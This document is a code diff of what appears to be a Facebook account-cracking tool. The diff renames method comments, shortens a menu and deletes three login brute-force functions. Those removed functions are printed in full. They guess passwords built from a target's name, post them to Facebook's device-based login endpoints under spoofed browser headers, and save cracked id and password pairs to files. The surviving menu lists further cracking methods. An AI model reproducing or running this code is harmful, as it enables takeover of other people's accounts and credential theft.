@@ -227,7 +227,7 @@ def menu():
 				clear()
 				print(' All method working ')
 				linex()
-				print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast) \n\033[1;33m [4]\033[1;37m Method  (for new ids)\033[1;32m   (best) \n \033[1;33m[5] \033[1;37mMethod  (for new ids) \033[1;32m  (slow) \n \033[1;33m[6] \033[1;37mMethod  (for new ids) \n \033[1;33m[7] \033[1;37mMethod  (for new ids) \n \033[1;33m[8] \033[1;37mMethod  (for new ids) ')
+				print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast) \n\033[1;33m [4]\033[1;37m Method  (for new ids)\033[1;32m   (best) \n \033[1;33m[5] \033[1;37mMethod  (for new ids) ')
 				linex()
 				mthd=input(' Choose: ')
 				linex()
@@ -443,7 +443,7 @@ def gmail():
 		input(' Press enter to back ')
 		os.system('python trt.py')
 #b-api method
-#1method
+#method(1)
 def api1(ids,names,passlist):
 		try:
 			global ok,loop
@@ -532,8 +532,7 @@ def api1(ids,names,passlist):
 			time.sleep(10)
 		except Exception as e:
 			pass
-#m2
-#b-graph method		
+#b-graph method(2)		
 def api2(ids,names,passlist):
         try:
                 global ok,loop,sim_id
@@ -612,7 +611,7 @@ def api2(ids,names,passlist):
                 loop+=1
         except Exception as e:
                 pass
-  #method3             
+  #method(3)             
 def api3(ids,names,passlist):
         try:
                 global ok,loop,sim_id
@@ -712,7 +711,7 @@ def api3(ids,names,passlist):
         except Exception as e:
                 pass
 #b-api method
-#method3                
+#method(4)                
 def api4(ids,names,passlist):
         try:
                 global ok,loop,sim_id
@@ -809,7 +808,7 @@ def api4(ids,names,passlist):
                 loop+=1
         except Exception as e:
                 pass
-#4method
+#method(5)
 def api5(ids,names,passlist):
         try:
                 global ok,loop,sim_id
@@ -928,130 +927,8 @@ def api5(ids,names,passlist):
                 loop+=1
         except Exception as e:
                 pass
-def api6(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			TRT=session.cookies.get_dict().keys()
-			if "c_user" in TRT:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
-				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in TRT:
-				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-#method6
-#d.fb
-def api7(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [TRT-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			TRT=session.cookies.get_dict().keys()
-			if "c_user" in TRT:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
-				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in TRT:
-				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-#method7
-def api8(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [TRT-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			TRT=session.cookies.get_dict().keys()
-			if "c_user" in TRT:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
-				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in TRT:
-				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-#method1rnd
+
+#method(1)
 def trt1(ids,passlist):
         global loop
         global oks
@@ -1158,7 +1035,7 @@ def trt1(ids,passlist):
                 loop+=1
         except Exception as e:
                 pass
-
+#method (2)
 def trt2(ids,passlist):
 	global loop
 	global oks
@@ -1236,8 +1113,7 @@ def trt2(ids,passlist):
 		time.sleep(10)
 	except Exception as e:
 		print(e)
-#new method
-                
+#method (3)  
 def trt3(ids,passlist):
         global loop
         global oks
